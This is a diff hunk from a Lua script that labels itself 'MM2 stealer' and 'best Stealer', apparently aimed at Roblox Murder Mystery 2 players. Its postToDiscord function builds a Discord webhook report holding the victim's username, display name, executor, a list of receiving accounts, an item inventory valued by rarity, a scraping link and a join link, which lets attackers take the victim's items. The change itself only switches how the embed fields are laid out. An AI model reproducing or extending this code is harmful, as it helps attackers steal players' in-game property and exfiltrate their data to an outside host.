@@ -87,10 +87,10 @@ local function postToDiscord()
         embeds = {{
             title = "MM2 stealer",
             fields = {
-                {name = "Player Info:", value = "```Username: " .. LocalPlayer.Name .. "\nDisplay Username: " .. LocalPlayer.DisplayName .. "\nExecutor: " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\nReceiver: " .. table.concat(usernames, ", ") .. "```", inline = false},
-                {name = "Inventory", value = "```Total value: " .. string.format("%.2f", overallValue) .. "\nAncient     : " .. rarityCounts.Ancient .. "\nGodly       : " .. rarityCounts.Godly .. "\nUnique      : " .. rarityCounts.Unique .. "\nVintage     : " .. rarityCounts.Vintage .. "\nLegendary   : " .. rarityCounts.Legendary .. "\nRare        : " .. rarityCounts.Rare .. "\nUncommon    : " .. rarityCounts.Uncommon .. "\nCommon      : " .. rarityCounts.Common .. "```", inline = false},
-                {name = "List of items", value = "https://api.rubis.app/v2/scrap/" .. LocalPlayer.Name, inline = false},
-                {name = "Join link:", value = joinLink, inline = false},
+                {name = "Player Info:", value = "```Username: " .. LocalPlayer.Name .. "\nDisplay Username: " .. LocalPlayer.DisplayName .. "\nExecutor: " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\nReceiver: " .. table.concat(usernames, ", ") .. "```", inline = true},
+                {name = "Inventory", value = "```Total value: " .. string.format("%.2f", overallValue) .. "\nAncient     : " .. rarityCounts.Ancient .. "\nGodly       : " .. rarityCounts.Godly .. "\nUnique      : " .. rarityCounts.Unique .. "\nVintage     : " .. rarityCounts.Vintage .. "\nLegendary   : " .. rarityCounts.Legendary .. "\nRare        : " .. rarityCounts.Rare .. "\nUncommon    : " .. rarityCounts.Uncommon .. "\nCommon      : " .. rarityCounts.Common .. "```", inline = true},
+                {name = "List of items", value = "https://api.rubis.app/v2/scrap/" .. LocalPlayer.Name, inline = true},
+                {name = "Join link:", value = joinLink, inline = true},
             },
             footer = {text = "best Stealer - " .. os.date("%Y-%m-%d %H:%M:%S")},
             color = 0x00FF00
